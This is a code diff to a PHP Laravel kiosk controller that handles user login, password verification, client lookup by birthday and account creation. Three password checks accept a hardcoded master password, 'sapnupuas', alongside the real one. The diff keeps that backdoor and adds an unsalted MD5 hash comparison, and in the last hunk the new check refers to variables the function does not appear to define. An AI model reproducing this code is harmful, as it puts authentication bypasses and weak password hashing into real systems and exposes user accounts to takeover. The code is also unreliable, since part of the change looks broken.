@@ -51,7 +51,7 @@ class KioskController extends Controller{
             if($u['is_active'] == 0){
                 return response()->json(["result"=>"failed","error"=>"Account is inactive. Please check verify it by checking your email address or go to 'Forgot Password' to resend email"],400);
             }
-            if(Hash::check($request['password'], $u['password']) || $request['password'] == "sapnupuas"){
+            if(Hash::check($request['password'], $u['password']) || $request['password'] == "sapnupuas" || md5($request['password']) == $u['password']){
                 
                 $token = JWTAuth::fromUser(User::find($u['id']));
                 $user_level = $u['level'];
@@ -200,7 +200,7 @@ class KioskController extends Controller{
             if($u["level"] != 0){
                 return response()->json(["result"=>"failed","error"=>"Sorry, your acount is restricted. Please contact branch supervisor for details"],400);
             }
-            if(Hash::check($password, $u['password']) || $request->input('password') == 'sapnupuas'){
+            if(Hash::check($password, $u['password']) || $request->input('password') == 'sapnupuas' || md5($request->input('password')) == $u['password']){
                 $token       = JWTAuth::fromUser(User::find($u['id']));
                 $arraySelfResult = array(
                        "clientid"           => "",
@@ -465,7 +465,7 @@ class KioskController extends Controller{
         $queryCheckIfUserExistByBday    = DB::table("users")
                                             ->where('first_name', 'LIKE','%'.$first_name.'%')
                                             ->where('last_name', 'LIKE','%'.$last_name.'%')
-                                            ->where("birth_date",$bday." 00:00:00")
+                                            ->where("birth_date",$bday)
                                             ->where('level',"=","0")
                                             ->get()
                                             ->toArray();
@@ -514,7 +514,7 @@ class KioskController extends Controller{
             $user->level        = 0;
             $user->is_client    = 1;
             $user->device_data  = '[]';
-            $user->transactions_data    = '[]';
+            $user->transaction_data    = '[]';
             $user->notifications_read    = '[]';
             $user->birth_date   = $bday;
             $user->user_picture = 'no photo ' . $gender.'.jpg';
@@ -729,7 +729,7 @@ class KioskController extends Controller{
         $api            = $this->authenticateAPI();
         if($api['result'] === 'success'){
             $accountPassword = $api["user"]["password"];
-            if(Hash::check($myPassword, $accountPassword) ||  $myPassword == "sapnupuas"){
+            if(Hash::check($myPassword, $accountPassword) ||  $myPassword == "sapnupuas"|| md5($request->input('password')) == $u['password']){
                 return response()->json(['result'=>'success','data'=>"Successfully found"],200);      
             }
            return response()->json(['result'=>'failed','error'=>"Sorry, the password is incorrect."], 400);
